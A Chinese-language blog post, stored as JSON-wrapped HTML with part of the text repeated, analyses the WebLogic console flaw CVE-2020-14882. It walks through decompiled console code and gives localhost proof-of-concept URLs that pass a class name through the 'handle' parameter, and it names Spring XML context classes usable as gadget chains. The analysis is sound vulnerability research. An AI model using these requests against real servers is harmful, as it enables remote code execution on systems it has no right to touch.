data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165553-36c39f96-1ce9-1.png\" alt=\"b25e91462b4994c165ba0d678d4bc1d7.png\"></p>\n<p>从上图可见，如果想执行69行的this.handle = HandleFactory.getHandle(handleStr);进入漏洞触发点，首先要满足67行的this.handle == null &amp;&amp; handleStr != null &amp;&amp; !handleStr.equals(“”)条件</p>\n<p>而String类型的handleStr变量是从66行处的this.findFirstHandle(req)获取到的看看weblogic如何从请求中获取handle</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">findFirstHandle</span><span class=\"params\">(HttpServletRequest request)</span> </span>&#123;</span><br><span class=\"line\">    String handle = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    Enumeration parms = request.getParameterNames();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(parms.hasMoreElements()) &#123;</span><br><span class=\"line\">        String parmName = (String)parms.nextElement();</span><br><span class=\"line\">        String parm = request.getParameter(parmName);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class=\"line\">            LOG.debug(<span class=\"string\">&quot;Looking at parameters = &quot;</span> + parmName);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (parmName.toLowerCase().indexOf(<span class=\"string\">&quot;password&quot;</span>) == -<span class=\"number\">1</span> &amp;&amp; parm.toLowerCase().indexOf(<span class=\"string\">&quot;password&quot;</span>) == -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                LOG.debug(<span class=\"string\">&quot;Looking at parm value = &quot;</span> + parm);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                LOG.debug(<span class=\"string\">&quot;Looking at parm value = ************&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.currentUrl.getParameter(parmName) == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.currentUrl.addParameter(parmName, parm);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (parmName.indexOf(REQUEST_CONTEXT_VALUE) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">            handle = parm;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> handle;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>findFirstHandle方法将会遍历请求中所有参数名以及参数值，随后通过如下代码判断参数名是否为”<br>handle”，代码如下:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (parmName.indexOf(REQUEST_CONTEXT_VALUE) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\thandle = parm;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里的REQUEST_CONTEXT_VALUE值为”handle”,见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165603-3ce2864e-1ce9-1.png\" alt=\"59ece6b0005427a66bfaeed26e13dab1.png\"></p>\n<p>当请求参数中有名为handle的参数时，findFirstHandle会将该参数的值进行返回。我们动态调试一下，看看分析的对不对，构造如下url：</p>\n<p><a href=\"http://localhost:7001/console/console.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=%E7%86%8A%E6%9C%AC%E7%86%8A%E6%9C%AC%E7%86%8A\">http://localhost:7001/console/console.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=熊本熊本熊</a></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165615-43d64e04-1ce9-1.png\" alt=\"26c733411771d6d3b7213a21eb37a046.png\"></p>\n<p>可见findFirstHandle将”熊本熊本熊”字符串返回</p>\n<p>回到init方法中，findFirstHandle将返回的url中handle参数值传递给handleStr变量，见下图66行</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165626-4a1369dc-1ce9-1.png\" alt=\"427e12f6c22a8ccb953521ac06d2ff9d.png\"></p>\n<p>handleStr变量进入67行if分支，并传递给漏洞执行点getHandle方法中</p>\n<p>getHandle方法中代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Handle <span class=\"title\">getHandle</span><span class=\"params\">(String serializedObjectID)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (StringUtils.isEmptyString(serializedObjectID)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> InvalidParameterException(<span class=\"string\">&quot;No serialized object string specified&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        serializedObjectID = serializedObjectID.replace(<span class=\"string\">&#x27;+&#x27;</span>, <span class=\"string\">&#x27; &#x27;</span>);</span><br><span class=\"line\">        String serialized = HttpParsing.unescape(serializedObjectID, <span class=\"string\">&quot;UTF-8&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">int</span> open = serialized.indexOf(<span class=\"number\">40</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (open &lt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> InvalidParameterException(<span class=\"string\">&quot;Syntax error parsing serializedObjectID string: &quot;</span> + serialized);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            String className = serialized.substring(<span class=\"number\">0</span>, open);</span><br><span class=\"line\">            String objectIdentifier = serialized.substring(open + <span class=\"number\">2</span>, serialized.length() - <span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                Class handleClass = Class.forName(className);</span><br><span class=\"line\">                Object[] args = <span class=\"keyword\">new</span> Object[]&#123;objectIdentifier&#125;;</span><br><span class=\"line\">                Constructor handleConstructor = handleClass.getConstructor(String.class);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> (Handle)handleConstructor.newInstance(args);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (ClassNotFoundException var8) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> InvalidParameterException(<span class=\"string\">&quot;No handle class found for type: &quot;</span> + className);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Exception var9) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> InvalidParameterException(<span class=\"string\">&quot;Unable to instanciate handle type: &quot;</span> + className, var9);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其实这里的内容很简单，让我们换一个poc，大家就会很清晰的了解getHandle的功能以及为什么可以造成代码执行漏洞。我们这里更换的poc如下：</p>\n<p><a href=\"http://localhost:7001/console/console.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=java.lang.String(&quot;kumamon.fun&quot;)\">http://localhost:7001/console/console.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=java.lang.String(&quot;kumamon.fun&quot;)</a></p>\n<p>此时传入getHandle的变量为String类型的字符串：java.lang.String(“kumamon.fun”)，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165638-519f7b96-1ce9-1.png\" alt=\"35ddc015a8b2deb9a9809b46c2a3857f.png\"></p>\n<p>接着getHandle方法判断字符串中左括号“(”的位置。(左括号ascii码值为40)，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165648-57677f60-1ce9-1.png\" alt=\"0be72a36dbd1638822c43a7c05d3815f.png\"></p>\n<p>紧接着，通过左括号位置，获取className以及objectIdentifier</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165658-5d4151b8-1ce9-1.png\" alt=\"3a9f5620e9e459c287958cf754780547.png\"></p>\n<p>这里className为字符串：java.lang.String而objectIdentifier为字符串kumamon.fun</p>\n<p>接着程序做了三件事情：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165708-635f032e-1ce9-1.png\" alt=\"698d79a1d772b6b0916f38db05d79b9a.png\"></p>\n<ol>\n<li><p>通过className获取对应的Class对象</p>\n</li>\n<li><p>将String类型的objectIdentifier存入 Object[]数组中</p>\n</li>\n<li><p>获取该类的带String类型参数的构造方法</p>\n</li>\n</ol>\n<p>最后，程序调用该带String类型参数的构造方法，实例化一个对象</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165718-692f1b68-1ce9-1.png\" alt=\"84d53abd6ffa717c23a1e140cef89675.png\"></p>\n<p>漏洞触发点到此已经分析结束了。回顾上文，当我们构造一个如下url时：</p>\n<p><a href=\"http://localhost:7001/console/console.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=a(&quot;b&quot;)\">http://localhost:7001/console/console.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=a(&quot;b&quot;)</a></p>\n<p>Weblogic将会调用a方法的带String类型参数的构造方法，并将b字符串传入执行</p>\n<p>那么我们怎么样才能找到这样一个利用链呢？需要满足恶意类中存在带String类型参数的构造方法、且该构造方法中存在着可以利用的地方，使得我们构造的字符串传入后可以顺利的执行。</p>\n<h2 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h2><p>不得不说，Weblogic的漏洞往往有着关联，比如说CVE-2019-2725，这个漏洞当时遇到的payload的条件与这次的几乎一样，在CVE-2019-2725漏洞中，廖新喜给出了一个无视jdk版本限制的利用链：</p>\n<p>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</p>\n<p><a href=\"http://xxlegend.com/2019/04/30/CVE-2019-2725%E5%88%86%E6%9E%90/\">http://xxlegend.com/2019/04/30/CVE-2019-2725%E5%88%86%E6%9E%90/</a></p>\n<p>但廖大神并没有给出具体的利用方式。详细的Poc构造以及利用可以参考我的这篇文章：</p>\n<p><em><a href=\"https://kumamon.fun/CVE-2020-14882/\">https://kumamon.fun/CVE-2020-14882/</a></em></p>\n<p>里面利用到的利用链即为：</p>\n<p>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext 这条</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165732-71dc06c2-1ce9-1.png\" alt=\"a5771d8a2b3650d45648e2d743bb0c5f.png\"></p>\n<p>于此同时，com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext</p>\n<p>与FileSystemXmlApplicationContext相同，都是继承了AbstractXmlApplicationContext类，因此ClassPathXmlApplicationContext这条也是可用的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165743-7873e1bc-1ce9-1.png\" alt=\"8b0786bd524d4951164bc0a0a1a95525.png\"></p>\n<h2 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h2><p>本来想将CVE-2020-14882、CVE-2020-14883放到一篇文章中来介绍，但奈何CVE-2020-14883这个漏洞中内容也挺多的，放在一块文章太长了。写的多不如写的细，因此把他们分开成为两个文章。</p>\n<p>后续关于FileSystemXmlApplicationContext这条利用链是如何构造的，我也想写一篇文章详细的谈谈，希望大家喜欢。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<p>在Oracle官方发布的2020年10月关键补丁更新公告CPU中，包含一个存在于Weblogic Console中的高危远程代码执行漏洞CVE-2020-14882。该漏洞与CVE-2020-14883权限绕过漏洞配合，可以使得攻击者在未经身份验证的情况下执行任意代码并接管WebLogic Server Console。</p>\n<p>在这篇文章中，我们首先来看看CVE-2020-14882代码执行漏洞。而后续下一篇文章，我将深入的分析下CVE-2020-14883权限绕过漏洞，并说明二者是如何配合使用的。</p>\n<h2 id=\"CVE-2020-14882\"><a href=\"#CVE-2020-14882\" class=\"headerlink\" title=\"CVE-2020-14882\"></a>CVE-2020-14882</h2><p>首先我们来研究下Weblogic Console HTTP协议远程代码执行漏洞。这个漏洞影响范围广：影响范围包含了Oracle Weblogic Server10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0这几个版本。</p>\n<p>网上关于这个漏洞的分析报告，多数是以Weblogic12版本展开的，10版本与12版本下的漏洞触发点相同点，但利用链不同。所以我在这里就拿Weblogic 10.3.6.0.0版本，对这个漏洞进行分析。</p>\n<p>按照惯例，我们从CVE-2020-14882相关漏洞细节入手，看看能不能还原出poc。</p>\n<p>关于CVE-2020-14882的漏洞详情如下：</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">“结合 CVE-2020-14883 漏洞，远程攻击者可以构造特殊的 HTTP请求，在未经身份验证的情况下接管 WebLogic<span class=\"built_in\"> Server Console </span>，并在 WebLogic Server</span><br><span class=\"line\">Console 执行任意代码。”</span><br></pre></td></tr></table></figure>\n\n<p>从描述上来看，CVE-2020-14883是权限绕过漏洞，而CVE-2020-14882是后台代码执行漏洞。我们要是想利用CVE-2020-14882。因此我们可以得到如下两个信息：</p>\n<ol>\n<li><p>攻击是通过向后台发送HTTP请求实现的</p>\n</li>\n<li><p>CVE-2020-14882须要有后台管理员权限</p>\n</li>\n</ol>\n<p>在此之外，我们还通过一些披露可以知道：</p>\n<p>本次漏洞实际执行点位于com/bea/console/handles/HandleFactory.class中的getHandle方法下图红框处</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165530-28e4d908-1ce9-1.png\" alt=\"337c31913917cad0ba284a2c3f35d4fc.png\"></p>\n<p>下面我们就试着还原一下这个漏洞：</p>\n<p>首先我们先以后台管理员的身份，访问一下后台地址</p>\n<p><a href=\"http://localhost:7001/console/console.portal?_nfpb=true&amp;_pageLabel=HomePage1\">http://localhost:7001/console/console.portal?_nfpb=true&amp;_pageLabel=HomePage1</a></p>\n<p>在我们的请求发送到Weblogic服务器后，程序会执行到com/bea/console/utils/BreadcrumbBacking.class，并调用其中init方法，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165541-2f9430c8-1ce9-1.png\" alt=\"4ac9666365bfc98564be4cd91de43805.png\"></p>\n<p>BreadcrumbBacking翻译过来大概是面包屑导航支持的意思。从笔者的理解来看，上图这里应该是Weblogic用来解析传入的url的作用。</p>\n<p>我们继续看init方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">(HttpServletRequest req, HttpServletResponse res)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (req.getParameter(NO_BC) == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">        String handleStr = <span class=\"keyword\">this</span>.findFirstHandle(req);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.handle == <span class=\"keyword\">null</span> &amp;&amp; handleStr != <span class=\"keyword\">null</span> &amp;&amp; !handleStr.equals(<span class=\"string\">&quot;&quot;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">this</span>.handle = HandleFactory.getHandle(handleStr);</span><br><span class=\"line\">                String name = <span class=\"keyword\">this</span>.handle.getDisplayName();</span><br><span class=\"line\">                req.getSession().setAttribute(BREADCRUMB_CONTEXT_VALUE, name);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Exception var6) &#123;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">this</span>.dispatchedValue = (BCValue)req.getSession().getAttribute(DISPATCHED_BREADCRUMB);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面节选了init方法中的一块代码片段，为什么要节选这个片段呢？原因很简单：这块代码段里多次出现了”Handle”字眼，这意味着代码涉及到从请求(req)中获取与Handle相关的操作。而代码中也存在着”HandleFactory.getHandle(handleStr);”</p>\n<p>回顾上文，本次漏洞实际执行点不正是位于com/bea/console/handles/HandleFactory.class中的getHandle方法中吗？</p>\n<p>看来漏洞入口被我们找到了，下面来看看怎么建立一条从url到漏洞入口的道路，重点分析如下代码</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165553-36c39f96-1ce9-1.png\" alt=\"b25e91462b4994c165ba0d678d4bc1d7.png\"></p>\n<p>从上图可见，如果想执行69行的this.handle = HandleFactory.getHandle(handleStr);进入漏洞触发点，首先要满足67行的this.handle == null &amp;&amp; handleStr != null &amp;&amp; !handleStr.equals(“”)条件</p>\n<p>而String类型的handleStr变量是从66行处的this.findFirstHandle(req)获取到的看看weblogic如何从请求中获取handle</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">findFirstHandle</span><span class=\"params\">(HttpServletRequest request)</span> </span>&#123;</span><br><span class=\"line\">    String handle = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    Enumeration parms = request.getParameterNames();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(parms.hasMoreElements()) &#123;</span><br><span class=\"line\">        String parmName = (String)parms.nextElement();</span><br><span class=\"line\">        String parm = request.getParameter(parmName);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class=\"line\">            LOG.debug(<span class=\"string\">&quot;Looking at parameters = &quot;</span> + parmName);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (parmName.toLowerCase().indexOf(<span class=\"string\">&quot;password&quot;</span>) == -<span class=\"number\">1</span> &amp;&amp; parm.toLowerCase().indexOf(<span class=\"string\">&quot;password&quot;</span>) == -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                LOG.debug(<span class=\"string\">&quot;Looking at parm value = &quot;</span> + parm);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                LOG.debug(<span class=\"string\">&quot;Looking at parm value = ************&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.currentUrl.getParameter(parmName) == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.currentUrl.addParameter(parmName, parm);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (parmName.indexOf(REQUEST_CONTEXT_VALUE) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">            handle = parm;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> handle;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>findFirstHandle方法将会遍历请求中所有参数名以及参数值，随后通过如下代码判断参数名是否为”<br>handle”，代码如下:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (parmName.indexOf(REQUEST_CONTEXT_VALUE) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\thandle = parm;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里的REQUEST_CONTEXT_VALUE值为”handle”,见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165603-3ce2864e-1ce9-1.png\" alt=\"59ece6b0005427a66bfaeed26e13dab1.png\"></p>\n<p>当请求参数中有名为handle的参数时，findFirstHandle会将该参数的值进行返回。我们动态调试一下，看看分析的对不对，构造如下url：</p>\n<p><a href=\"http://localhost:7001/console/console.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=%E7%86%8A%E6%9C%AC%E7%86%8A%E6%9C%AC%E7%86%8A\">http://localhost:7001/console/console.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=熊本熊本熊</a></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165615-43d64e04-1ce9-1.png\" alt=\"26c733411771d6d3b7213a21eb37a046.png\"></p>\n<p>可见findFirstHandle将”熊本熊本熊”字符串返回</p>\n<p>回到init方法中，findFirstHandle将返回的url中handle参数值传递给handleStr变量，见下图66行</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165626-4a1369dc-1ce9-1.png\" alt=\"427e12f6c22a8ccb953521ac06d2ff9d.png\"></p>\n<p>handleStr变量进入67行if分支，并传递给漏洞执行点getHandle方法中</p>\n<p>getHandle方法中代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Handle <span class=\"title\">getHandle</span><span class=\"params\">(String serializedObjectID)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (StringUtils.isEmptyString(serializedObjectID)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> InvalidParameterException(<span class=\"string\">&quot;No serialized object string specified&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        serializedObjectID = serializedObjectID.replace(<span class=\"string\">&#x27;+&#x27;</span>, <span class=\"string\">&#x27; &#x27;</span>);</span><br><span class=\"line\">        String serialized = HttpParsing.unescape(serializedObjectID, <span class=\"string\">&quot;UTF-8&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">int</span> open = serialized.indexOf(<span class=\"number\">40</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (open &lt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> InvalidParameterException(<span class=\"string\">&quot;Syntax error parsing serializedObjectID string: &quot;</span> + serialized);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            String className = serialized.substring(<span class=\"number\">0</span>, open);</span><br><span class=\"line\">            String objectIdentifier = serialized.substring(open + <span class=\"number\">2</span>, serialized.length() - <span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                Class handleClass = Class.forName(className);</span><br><span class=\"line\">                Object[] args = <span class=\"keyword\">new</span> Object[]&#123;objectIdentifier&#125;;</span><br><span class=\"line\">                Constructor handleConstructor = handleClass.getConstructor(String.class);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> (Handle)handleConstructor.newInstance(args);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (ClassNotFoundException var8) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> InvalidParameterException(<span class=\"string\">&quot;No handle class found for type: &quot;</span> + className);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Exception var9) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> InvalidParameterException(<span class=\"string\">&quot;Unable to instanciate handle type: &quot;</span> + className, var9);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        